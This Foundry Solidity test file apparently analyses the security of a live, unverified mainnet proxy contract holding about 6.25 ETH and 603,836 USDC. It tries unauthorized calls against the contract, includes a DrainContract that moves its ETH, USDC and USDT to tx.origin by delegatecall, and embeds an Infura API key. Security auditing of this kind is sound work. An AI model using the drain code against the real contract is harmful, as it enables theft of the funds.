// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title DSProxyV3Analysis
 * @notice Deep analysis of unverified contract 0x5050e08626c499411B5D0E0b5AF0E83d3fD82EDF
 *
 * Contract Type: DSProxy variant with UniswapV3 callback
 * Value at Risk: ~6.25 ETH + ~603,836 USDC + ~100 USDT
 *
 * Key Functions:
 * - execute(address,bytes) [0x1cff79cd] - delegatecall with auth
 * - execute(bytes,bytes) [0x1f6a1eb9] - cache-based delegatecall
 * - uniswapV3SwapCallback [0xfa461e33] - callback handler
 * - rely/deny - authorization management
 */
contract DSProxyV3Analysis is Test {
    address constant TARGET = 0x5050e08626c499411B5D0E0b5AF0E83d3fD82EDF;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant UNI_FACTORY = 0x1f98431c8ad98523631ae4a59f267346ea31f984;

    // Hardcoded whitelist addresses (first 10)
    address[] whitelistSample;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");

        whitelistSample.push(0x8edfcca52d5c9116ff67e58b85c7eb0d98e2e989);
        whitelistSample.push(0x36d63e35446baf55893a710cfe6dbdd300ece496);
        whitelistSample.push(0x24affae9c683b7615d4130300288e348e4b5d091);
        whitelistSample.push(0x4acfcc3bed619324aff2c0596d87f23b2c03ffae);
    }

    /// @notice Test 1: Verify authorization mechanism
    function test_AuthorizationCheck() public {
        console.log("=== TEST 1: Authorization Check ===");

        // Unauthorized call should revert
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);

        (bool success,) = TARGET.call(
            abi.encodeWithSelector(0x1cff79cd, address(this), "")
        );
        assertFalse(success, "Unauthorized execute should fail");

        vm.stopPrank();
        console.log("[PASS] Unauthorized access blocked");
    }

    /// @notice Test 2: Check if whitelisted address can execute
    function test_WhitelistCanExecute() public {
        console.log("=== TEST 2: Whitelist Execute ===");

        address whitelisted = whitelistSample[0];
        vm.startPrank(whitelisted);

        // Try to execute a simple call
        (bool success, bytes memory data) = TARGET.call(
            abi.encodeWithSelector(
                0x78e111f6, // execute(address,bytes) returns (bytes)
                address(0), // empty target
                ""
            )
        );

        // Should succeed or revert with specific error (not auth error)
        console.log("Whitelist execute result:", success);

        vm.stopPrank();
    }

    /// @notice Test 3: Callback with malformed data
    function test_CallbackMalformedData() public {
        console.log("=== TEST 3: Callback Malformed Data ===");

        // Try calling callback directly (should fail - not a pool)
        (bool success,) = TARGET.call(
            abi.encodeWithSelector(
                bytes4(0xfa461e33), // uniswapV3SwapCallback
                int256(1e18),       // amount0Delta
                int256(0),          // amount1Delta
                ""                  // empty data
            )
        );

        assertFalse(success, "Direct callback should fail pool check");
        console.log("[PASS] Direct callback rejected");
    }

    /// @notice Test 4: Analyze callback pool verification edge cases
    function test_CallbackPoolVerification() public {
        console.log("=== TEST 4: Pool Verification Analysis ===");

        // The callback computes pool address via CREATE2
        // Memory layout: 0xff || factory || salt[32] || initHash[32]

        // Try to find if any salt could make us the "pool"
        bytes32 initHash = 0xe34f199b19b2b4f47f68442619d555527d244f78a3297ea89325f843f87b8b54;

        // For our address to be computed as the pool, we'd need:
        // keccak256(0xff || factory || salt || initHash) == address(this)
        // This is computationally infeasible

        console.log("[INFO] Pool address collision infeasible");
    }

    /// @notice Test 5: Check for transfer mode bypass in callback
    function test_CallbackTransferModeAnalysis() public {
        console.log("=== TEST 5: Transfer Mode Analysis ===");

        // The callback has 3 transfer modes:
        // 1. flag == ADDRESS (this contract) -> skip transfer
        // 2. flag == 1 -> direct transfer
        // 3. else -> transferFrom

        // If we could call with flag == TARGET, transfer would be skipped
        // But only valid pools can call

        console.log("[INFO] Transfer mode bypass requires pool caller access");
    }

    /// @notice Test 6: Check current balances at risk
    function test_ValueAtRisk() public view {
        console.log("=== TEST 6: Value at Risk ===");

        uint256 ethBal = TARGET.balance;
        console.log("ETH balance:", ethBal / 1e18, ".", ethBal % 1e18 / 1e14);

        uint256 usdcBal = IERC20(USDC).balanceOf(TARGET);
        console.log("USDC balance:", usdcBal / 1e6, ".", usdcBal % 1e6);

        uint256 usdtBal = IERC20(USDT).balanceOf(TARGET);
        console.log("USDT balance:", usdtBal / 1e6, ".", usdtBal % 1e6);
    }

    /// @notice Test 7: Check wards mapping state
    function test_WardsMapping() public view {
        console.log("=== TEST 7: Wards Mapping State ===");

        // wards is at slot 0
        bytes32 slot0 = vm.load(TARGET, bytes32(0));
        console.log("Slot 0 (wards base):", uint256(slot0));

        // Check if any common addresses are wards
        for (uint i = 0; i < whitelistSample.length; i++) {
            bytes32 wardSlot = keccak256(abi.encode(whitelistSample[i], uint256(0)));
            bytes32 wardValue = vm.load(TARGET, wardSlot);
            if (uint256(wardValue) > 0) {
                console.log("Ward found:", whitelistSample[i]);
            }
        }
    }

    /// @notice Test 8: Try to exploit via delegatecall to malicious contract
    function test_DelegatecallExploit() public {
        console.log("=== TEST 8: Delegatecall Exploit Attempt ===");

        // Deploy malicious contract that would drain funds
        DrainContract drain = new DrainContract();

        // Try to execute as unauthorized user
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);

        (bool success,) = TARGET.call(
            abi.encodeWithSelector(
                0x1cff79cd,
                address(drain),
                abi.encodeWithSelector(DrainContract.drain.selector)
            )
        );

        assertFalse(success, "Unauthorized delegatecall should fail");
        vm.stopPrank();
        console.log("[PASS] Unauthorized delegatecall blocked");
    }

    /// @notice Test 9: Check fallback behavior
    function test_FallbackBehavior() public {
        console.log("=== TEST 9: Fallback Behavior ===");

        // Send with unknown selector
        (bool success,) = TARGET.call(abi.encodeWithSelector(bytes4(0xdeadbeef)));
        assertFalse(success, "Unknown selector should revert");

        // Send with no data
        (success,) = TARGET.call("");
        assertFalse(success, "Empty call should revert");

        console.log("[PASS] Fallback properly reverts");
    }

    /// @notice Test 10: Comprehensive invariant check
    function test_InvariantCheck() public {
        console.log("=== TEST 10: Invariant Check ===");

        // Record initial state
        uint256 initEth = TARGET.balance;
        uint256 initUsdc = IERC20(USDC).balanceOf(TARGET);

        // Execute multiple attack vectors
        address attacker = makeAddr("attacker");

        // Vector 1: Direct execute
        vm.prank(attacker);
        TARGET.call(abi.encodeWithSelector(0x1cff79cd, attacker, ""));

        // Vector 2: Direct callback
        vm.prank(attacker);
        TARGET.call(abi.encodeWithSelector(0xfa461e33, int256(1e18), int256(0), ""));

        // Vector 3: Fallback
        vm.prank(attacker);
        TARGET.call(hex"deadbeef");

        // Vector 4: rely
        vm.prank(attacker);
        TARGET.call(abi.encodeWithSelector(0x65fae35e, attacker));

        // Vector 5: setCache
        vm.prank(attacker);
        TARGET.call(abi.encodeWithSelector(0x948f5076, attacker));

        // Verify balances unchanged
        assertEq(TARGET.balance, initEth, "ETH balance changed!");
        assertEq(IERC20(USDC).balanceOf(TARGET), initUsdc, "USDC balance changed!");

        console.log("[PASS] All invariants held - no unauthorized value extraction");
    }

    /// @notice Analyze what would happen if a whitelist key was compromised
    function test_CompromisedKeyScenario() public {
        console.log("=== TEST 11: Compromised Key Scenario ===");

        // Simulate compromised whitelist key
        address compromised = whitelistSample[0];

        // Deploy drain contract
        DrainContract drain = new DrainContract();

        vm.startPrank(compromised);

        // Record balances
        uint256 preEth = TARGET.balance;
        uint256 preUsdc = IERC20(USDC).balanceOf(TARGET);

        // Execute drain via delegatecall
        (bool success,) = TARGET.call(
            abi.encodeWithSelector(
                0x1cff79cd,
                address(drain),
                abi.encodeWithSelector(DrainContract.drain.selector)
            )
        );

        vm.stopPrank();

        if (success) {
            console.log("[CRITICAL] Compromised key can drain funds!");
            console.log("ETH drained:", (preEth - TARGET.balance) / 1e18);
            console.log("USDC drained:", (preUsdc - IERC20(USDC).balanceOf(TARGET)) / 1e6);
        } else {
            console.log("[INFO] Execute failed (unexpected)");
        }
    }
}

/// @notice Helper contract for drain simulation
contract DrainContract {
    function drain() external {
        // In delegatecall context, this runs as the DSProxy
        address payable attacker = payable(tx.origin);

        // Drain ETH
        uint256 ethBal = address(this).balance;
        if (ethBal > 0) {
            attacker.transfer(ethBal);
        }

        // Drain USDC
        IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        uint256 usdcBal = usdc.balanceOf(address(this));
        if (usdcBal > 0) {
            usdc.transfer(attacker, usdcBal);
        }

        // Drain USDT
        IERC20 usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
        uint256 usdtBal = usdt.balanceOf(address(this));
        if (usdtBal > 0) {
            usdt.transfer(attacker, usdtBal);
        }
    }
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}
